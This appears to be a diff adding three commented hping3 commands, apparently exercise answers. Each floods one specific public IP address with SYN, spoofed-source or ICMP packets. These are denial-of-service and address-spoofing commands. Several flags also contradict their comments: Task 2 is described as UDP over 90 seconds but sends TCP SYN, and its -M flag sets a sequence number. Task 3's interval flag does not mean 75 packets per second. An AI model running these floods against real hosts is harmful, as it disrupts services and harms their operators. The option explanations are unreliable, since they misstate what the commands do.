@@ -1,0 +1,8 @@
+# Task 1: Sending 10,000 TCP packets all at once from random source IP addresses
+hping3 --rand-source -c 10000 -S -p 80 146.190.242.155
+
+# Task 2: Sending 9,000 UDP packets in a span of 90 seconds from a spoofed source address
+hping3 --spoof <spoofed_source_IP> -c 9000 -d 100 -S -w 64 -p 53 --flood --rand-source --ttl 32 -M 90 146.190.242.155
+
+# Task 3: Sending 11,000 ICMP packets with a data size of 1KB at an interval of 75 packets per second
+hping3 --icmp --data 1024 -c 11000 -i u75 146.190.242.155
